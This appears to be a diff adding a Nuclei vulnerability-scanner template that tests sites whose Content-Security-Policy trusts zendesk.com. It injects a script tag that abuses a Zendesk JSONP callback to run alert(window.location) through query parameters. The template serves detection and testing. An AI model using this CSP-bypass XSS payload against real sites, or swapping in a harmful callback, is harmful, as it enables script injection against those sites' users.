@@ -1,0 +1,55 @@
+id: zendesk-support-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Zendesk Support
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,zendesk-support
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "zendesk.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: zendesk_support_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://support.zendesk.com/accounts/reminder?callback=alert(window.location)//"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "zendesk_support_csp_xss == true"
+# digest: 4a0a0047304502203f5a5aa45726642e24e1587e299ebe65f34091af380893688a398f11d6b47969022100cdd25982de6ee24fde754d7fde635bf933007f6614a2468d4f503fc0b97513e9:922c64590222798bb761d5b6d8e72950
